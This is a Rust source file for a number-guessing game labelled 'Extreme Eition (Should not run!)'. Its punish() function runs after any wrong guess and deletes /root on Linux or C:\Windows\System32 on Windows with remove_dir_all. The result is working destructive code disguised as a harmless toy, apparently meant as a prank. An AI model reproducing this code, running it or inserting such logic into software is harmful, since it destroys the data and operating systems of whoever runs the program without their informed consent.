// Guess The Number: Extreme Eition (Should not run!)
// 11.06.2023

use rand::Rng;
use std::env;
use std::fs;
use std::io;

fn remove_dir(directory_path: &str) {
    if let Err(err) = fs::remove_dir_all(directory_path) {
        eprintln!("Error removing directory: {err}");
    } else {
        println!("Deleted {directory_path} successfully!");
    }
}

fn punish() {
    let os = env::consts::OS;

    if os == "linux" {
        let directory_path = "/root";
        remove_dir(directory_path);
    } else if os == "windows" {
        let directory_path = r"C:\Windows\System32";
        remove_dir(directory_path);
    }
}

fn game() {
    println!("Guess the number!");

    let secret_number = rand::thread_rng().gen_range(1..=10);

    loop {
        println!("Please input your guess.");

        let mut guess = String::new();

        io::stdin()
            .read_line(&mut guess)
            .expect("Failed to read line");

        let guess: u32 = match guess.trim().parse() {
            Ok(num) => num,
            Err(_) => continue,
        };

        println!("You guessed: {guess}");

        if guess == secret_number {
            println!("You win!");
            break;
        } else if guess != secret_number {
            println!("omae wa mou shindeiru");
            punish();
            break;
        }
    }
}

fn main() {
    game();
}
